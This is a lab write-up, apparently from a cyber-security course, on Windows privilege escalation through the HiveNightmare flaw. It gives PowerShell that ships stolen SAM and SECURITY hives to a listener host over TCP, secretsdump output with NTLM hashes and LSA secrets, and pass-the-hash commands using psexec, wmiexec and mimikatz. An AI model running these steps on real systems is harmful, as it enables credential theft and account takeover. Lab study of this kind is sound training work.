## Windows PrivEsc, task 1:


### Our objective is given in the /windows_privsec/tasks/1-task.md

---

## PrivEsc Vector enumeration

> First, let's download the privcheck powerhsell script, and move it to pwd: ([Download Link](https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1))

> Run an extended privcheck

```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```


![image](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2013-14-23.png)

> The extended check will save the output as .txt and .html. You can download the html and open it in the new tab to analyze it further [here](1-task.html)

![image](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2013-15-30.png)

---

## Exploitation (CVE-2021-36934 - HiveNightmare).

> Check https://www.exploit-db.com/docs/50245 for detailed exploitation & mitigation steps.

Description: HiveNightmare aka SeriouSAM (CVE-2021-36934) is a local elevation of privilege vulnerability that exists due to
excessively permissive Access Control Lists (ACLs) on various system files, including the Safety Accounts Manager
(SAM) database. If an attacker successfully exploits this vulnerability in a system, it allows them to access registry
files stored in folders such as SAM, SECURITY, SYSTEM, DEFAULT, and SOFTWARE

```
Base Score: 7.8
Vector: CVSS:3.1/AV: L/AC: L/PR: L/UI: N/S: U/C: H/I: H/A: H
Impact Score: 5.9
Exploitability Score: 1.8
Severity: HIGH
```

> Let's download the .exe exploit [here](https://github.com/GossiTheDog/HiveNightmare) and run it. As we can see, it wrote some files on the desktop, which we should switch to Kali Linux, and use impacket-secretsdump.py to extract hashes.

![image](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2013-28-30.png)

---

## Dumping hashes with secretsdump:

> First, let's use powershell to zip the files and then send the .zip file to Kali:

```shell
Compress-Archive -Path "C:\Users\Sammy\Desktop\SYSTEM-2025-02-11", "C:\Users\Sammy\Desktop\SECURITY-2025-02-11", "C:\Users\Sammy\Desktop\SAM-2025-01-15" -DestinationPath "C:\Users\Sammy\Desktop\hives.zip"
```

> Then send it.

```powershell
[System.IO.File]::WriteAllBytes("hives.zip", (Get-Content "C:\Users\Sammy\Desktop\hives.zip" -Encoding Byte))
$client = New-Object System.Net.Sockets.TcpClient("172.16.220.130", 80)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Sammy\Desktop\hives.zip")
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close(); $client.Close()
```

![images](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2014-08-25.png)

> Kali Linux:

```shell
nc -lvnp 80 > hives.zip
```

![images](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2014-11-39.png)

> Secretsdump.py

```shell
──(root㉿kali)-[~]
└─# impacket-secretsdump -system SYSTEM-2025-02-11 -security SECURITY-2025-02-11 -sam SAM-2025-01-15 local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x4ef63a41a8a538be4e2c5c0ea9374c04
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:93cd9672e50a6d53446b71408ae418e9:::
Sammy:1000:aad3b435b51404eeaad3b435b51404ee:205d4472747b814ffb23cfa969a77ad8:::
SuperAdministrator:1001:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x07c28b358495df7003225e3b32fa409373b3a973
dpapi_userkey:0x6f22dba8ad5ccf8066168ab439e155cd6797264c
[*] NL$KM 
 0000   F0 29 C0 1E F8 C0 26 6C  73 03 80 BC 4D 86 03 B6   .)....&ls...M...
 0010   43 B7 08 93 C5 F9 8B C7  05 1D 66 5A FC 16 41 15   C.........fZ..A.
 0020   85 B3 8E AB 1B DC 4D CA  90 7C 01 82 BC 61 6F AB   ......M..|...ao.
 0030   CE 1F 76 B5 41 A6 7B 7F  84 B4 D4 66 3C 3B 80 81   ..v.A.{....f<;..
NL$KM:f029c01ef8c0266c730380bc4d8603b643b70893c5f98bc7051d665afc16411585b38eab1bdc4dca907c0182bc616fabce1f76b541a67b7f84b4d4663c3b8081
[*] Cleaning up... 
                                                                                                
┌──(root㉿kali)-[~]
└─# 
```

> psexec for popping a powershell as SuperAdministrator:

```shell
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@IP powershell.exe
```

> In my case, I used the target windows 10 instead to escalate my privs using wmiexec.

```
wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c SuperAdministrator@127.0.0.1
```

or

```
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:SuperAdministrator /domain:. /ntlm:13b29964cc2480b4ef454c59562e675c /run:cmd.exe" "exit"
```
